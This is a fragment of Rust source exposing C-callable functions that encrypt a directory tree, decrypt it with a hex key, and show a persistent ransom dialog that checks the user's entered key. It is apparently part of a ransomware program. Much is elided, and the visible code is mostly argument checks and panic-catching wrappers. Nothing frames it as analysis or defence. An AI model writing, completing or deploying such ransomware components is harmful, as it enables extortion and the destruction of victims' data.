...
pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut c_char {
    let result = panic::catch_unwind(|| {
        unsafe {
            ...
            let path_str = match c_str.to_str() {
                Ok(s) => s,
                Err(_) => {
                    return CString::new("ERROR:Invalid UTF-8 in path")
                        .unwrap()
                        .into_raw()
                }
            };
    ...
    match result {
        Ok(ptr) => ptr,
        Err(_) => CString::new("ERROR:Panic during encryption")
            .unwrap()
            .into_raw(),
    }
}
...
pub extern "C" fn decrypt_directory(
    ...
    let result = panic::catch_unwind(|| {
        unsafe {
            if path.is_null() || key_hex.is_null() {
                return CString::new("ERROR:Null parameter provided")
                    .unwrap()
                    .into_raw();
            }
            ...
            let key_bytes = match hex_decode(key_str) {
                Ok(bytes) => bytes,
                Err(e) => {
                    return CString::new(format!("ERROR:Invalid key format: {}", e))
                        .unwrap()
                        .into_raw()
                }
            };
    ...
    match result {
        Ok(ptr) => ptr,
        Err(_) => CString::new("ERROR:Panic during decryption")
            .unwrap()
            .into_raw(),
    }
}
...
pub extern "C" fn show_persistent_ransom_dialog(correct_key: *const c_char) -> *mut c_char {
    let result = panic::catch_unwind(|| unsafe {
        ...
        match ransom_dialog::show_ransom_dialog(key_str) {
            Ok(_) => CString::new("OK:User entered correct key")
                .unwrap()
                .into_raw(),
    ...
    match result {
        Ok(ptr) => ptr,
        Err(_) => CString::new("ERROR:Panic during dialog display")
            .unwrap()
            .into_raw(),
    }
}
